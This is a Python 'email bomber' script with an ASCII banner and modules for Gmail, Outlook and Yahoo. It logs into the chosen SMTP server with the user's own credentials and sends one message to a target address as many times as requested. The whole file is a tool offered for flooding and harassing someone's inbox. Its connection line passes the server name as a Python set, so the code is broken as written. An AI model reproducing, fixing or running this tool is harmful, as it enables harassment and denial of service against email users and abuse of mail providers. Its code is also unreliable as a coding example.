import smtplib, ssl
import time
import os
import sys
from os import system
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[1;94m', '\033[1;91m', '\33[1;97m', '\33[1;93m', '\033[1;35m', '\033[1;32m', '\033[0m'
context = ssl.create_default_context()
def clear():
        _ = system('cls')
def bomb(server, sender_email, receiver_email, message, times, password):
    try:
        clear()
        server = smtplib.SMTP({server}, 587)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(sender_email, password)
        global intcount
        intcount = 1
        for i in range(times): 
            time.sleep(1)
            server.sendmail(sender_email, receiver_email, message)
            print(f"Emails sent: [{intcount}] to [{receiver_email}]" )
            intcount = intcount + 1
    except Exception as e: #prints the error
        print(RED + "[-] Error")
        print(e)
        time.sleep(1)
    finally:
        time.sleep(1)
        server.quit() #quits after all emails have been sent

banner = BLUE + '''
        V2 Made by Jammy#4613
███████╗███╗   ███╗ █████╗ ██╗██╗         ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔══██╗██║██║         ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
█████╗  ██╔████╔██║███████║██║██║         ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══╝  ██║╚██╔╝██║██╔══██║██║██║         ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████╗██║ ╚═╝ ██║██║  ██║██║███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
'''
modules = '''
[!] MODULES [!]
[1] Gmail bomber
[2] Outlook mail bomber
[3] Yahoo mail bomber
'''
clear()
print(banner)
print(modules)
modulechoose = input(GREEN + "[+]Enter module: ")
if modulechoose == '1':
    sender_email1 = input("[+] Enter your email: ")
    password1 = input("[+] Enter your password: ")
    receiver_email1 = input("[+] Enter receiver email: ")
    message1 = input("[+] Enter message: ")
    times1 = int(input("[+] Enter ammount of times: "))
    bomb("smtp.gmail.com", sender_email1, receiver_email1, message1, times1, password1)
if modulechoose == '2':
    sender_email1 = input("[+] Enter your email: ")
    password1 = input("[+] Enter your password: ")
    receiver_email1 = input("[+] Enter receiver email: ")
    message1 = input("[+] Enter message: ")
    times1 = int(input("[+] Enter ammount of times: "))
    bomb("smtp.mail.outlook.com", sender_email1, receiver_email1, message1, times1, password1)
if modulechoose == '3':
    sender_email1 = input("[+] Enter your email: ")
    password1 = input("[+] Enter your password: ")
    receiver_email1 = input("[+] Enter receiver email: ")
    message1 = input("[+] Enter message: ")
    times1 = int(input("[+] Enter ammount of times: "))
    bomb("smtp.mail.yahoo.com", sender_email1, receiver_email1, message1, times1, password1)
